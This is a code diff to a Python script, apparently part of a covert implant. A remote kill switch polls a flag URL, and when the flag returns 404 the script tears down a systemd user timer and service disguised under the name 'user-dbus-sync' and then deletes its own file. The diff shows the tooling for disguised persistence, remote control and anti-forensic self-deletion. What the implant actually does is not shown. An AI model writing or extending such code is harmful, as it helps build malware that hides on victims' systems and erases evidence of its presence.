@@ -29,25 +29,44 @@ def kill_switch_loop():
 
 def check_kill_switch():
     import requests
+    import subprocess
+    print("checking kill switch...")
     try:
-        # Cache-busting: append a unique timestamp as a query parameter
-        # Example: .../flag.txt?nocache=1710144505.123
         unique_url = f"{BASE_FLAG_URL}?nocache={time.time()}"
-        
-        # We use a HEAD request to save bandwidth
         response = requests.head(unique_url)
-        # If GitHub returns 404, the file is officially gone
+        
         if response.status_code == 404:
             print("Flag not found (404)! Initiating self-destruct...")
+            
+            # 1. Clean up persistence files
+            systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
+            service_name = "user-dbus-sync"
+            
+            try:
+                # Stop and disable the timer/service
+                subprocess.run(
+                    ["systemctl", "--user", "disable", "--now", f"{service_name}.timer", f"{service_name}.service"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                # Remove the files
+                os.remove(os.path.join(systemd_user_dir, f"{service_name}.service"))
+                os.remove(os.path.join(systemd_user_dir, f"{service_name}.timer"))
+                # Reload daemon
+                subprocess.run(["systemctl", "--user", "daemon-reload"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                print("[*] Persistence mechanisms removed.")
+            except Exception as e:
+                print(f"[-] Could not remove persistence: {e}")
+
+            # 2. Delete the script itself
             f = __file__
             try:
                 os.remove(f)
                 print(f"[*] Deleted {f}")
             except Exception as e:
                 print(f"[-] Could not delete {f}: {e}")
+                
             return True 
         
-        # print(f"Flag still exists (Status: {response.status_code}). Standing by.")
         return False
 
     except Exception as e:
